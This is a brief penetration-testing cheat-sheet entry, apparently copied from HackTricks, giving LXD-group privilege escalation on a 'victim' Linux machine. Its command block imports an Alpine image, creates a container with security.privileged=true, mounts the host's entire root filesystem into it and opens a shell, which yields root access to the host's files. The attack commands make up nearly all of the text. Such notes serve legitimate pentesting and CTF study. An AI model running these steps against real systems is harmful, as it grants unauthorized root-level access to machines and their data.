## lxd priv esc victim
(hacktricks)
- import the image
- before running the image, start and configure the lxd storage pool as default
- run the image
- mount the /root into the image
- interact with the container
```
lxc image import ./alpine*.tar.gz --alias myimage # It's important doing this from YOUR HOME directory on the victim machine, or it might fail.

lxd init

lxc init myimage mycontainer -c security.privileged=true

lxc config device add mycontainer mydevice disk source=/ path=/mnt/root recursive=true

lxc start mycontainer
lxc exec mycontainer /bin/sh
```
